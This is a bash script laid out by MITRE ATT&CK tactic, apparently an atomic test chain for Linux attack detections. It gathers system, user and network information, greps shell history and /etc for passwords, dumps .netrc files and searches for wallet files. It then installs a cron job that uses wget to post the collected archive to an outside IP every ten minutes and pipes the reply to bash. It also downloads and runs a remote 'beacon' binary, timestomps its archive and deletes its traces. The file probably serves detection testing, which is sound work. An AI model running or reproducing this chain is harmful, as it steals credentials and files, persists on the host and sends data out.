#!/bin/bash

local="/tmp/"
stage="/tmp/.stage_chain/"
if [ ! -d "${stage}" ]; then mkdir -p ${stage}; fi;
if [ ! -d "${local}" ]; then mkdir -p ${local}; fi;
############################################
# Tactic: Discovery
# Technique: System Information Discovery https://attack.mitre.org/wiki/Technique/T1082
############################################
function discovery() {
  # List OS Information
  echo -e "\n Collecting OS/Host Information \n"
  OSINFO="${stage}/sys.txt"
  USRINFO="${stage}/user.txt"
  NWINFO="${stage}/nw.txt"
  interest="${stage}/filesofinterest.txt"
  uname -a >> ${OSINFO}
  if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> ${OSINFO}; fi;
  if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> ${OSINFO}; fi;
  if [ -f /etc/issue ]; then cat /etc/issue >> ${OSINFO}; fi;
  echo "uptime: " >> ${OSINFO} && uptime >> ${OSINFO}
  echo "Hostname: " >> ${OSINFO} && hostname >> ${OSINFO}
  env >> ${OSINFO}
  cat ${OSINFO} 2>/dev/null

  # Linux VM Check via Hardware
  if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon >> ${OSINFO}; fi;
  if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware" >> ${OSINFO}; fi;
  if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU" >> ${OSINFO}; fi;
  if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i "vmware\|vbox" >> ${OSINFO}; fi;
  if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual" >> ${OSINFO}; fi;

  echo "ARP: " >> ${USRINFO} && arp -a >> ${NWINFO}
  echo "Netstat: " >> ${USRINFO} && netstat -plntu >> ${NWINFO}

  echo "users: " >> ${USRINFO} && users >> ${USRINFO}
  echo "last: " >> ${USRINFO} && last >> ${USRINFO}
  cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' >> ${USRINFO}
  echo "Pass Comp: " >>  ${USRINFO} && passwd --status  >> ${USRINFO}

  grep -ri password /etc/ 2>/dev/null >> ${interest}
  for file in $(find / -name .netrc 2> /dev/null);do echo $file >> $interest; cat $file >> $interest; done
  find ~ -name "*wallet*" >> $interest;
}


function persistence() {
  ############################################
  # Tactic: Schedule cron job for scheduled Exfiltration
  # Technique: System Information Discovery https://attack.mitre.org/wiki/Technique/T1082
  ############################################
  echo -e "*/10 * * * * $USER wget --post-file=${local}install_log.zip https://192.168.11.110/upload.php -q | bash > /dev/null 2>&1" > /tmp/cron
  crontab /tmp/cron

  curl --silent -o "/tmp/beacon" https://raw.githubusercontent.com/greycel/Linux-Attack-Detections/main/Atomic_Chains/hello/atomic-hello
  chmod +x "/tmp/beacon" && /tmp/beacon
}



function prepare_local() {
  #   Tactic: Compress data before exfiltration [T1560.002]
  #   Technique: T1560.002 - Archive Collected Data: Archive via Library
  zip -r ${local}install_log.zip ${stage}

  #   Tactic: Defense Evasion
  #   Technique: T1099 - Timestomp
  touch -acmr /bin/sh /tmp/install_log.zip
}


############################################
# Tactic: Defense Evasion
# Technique: Delete File Indicator Removal on Host: File Deletion https://attack.mitre.org/techniques/T1070/004/
############################################
function cleanup() {
  rm -rf ${stage}
  rm -rf ${local}cron
  rm -rf ${local}beacon
}


discovery
persistence
prepare_local
cleanup
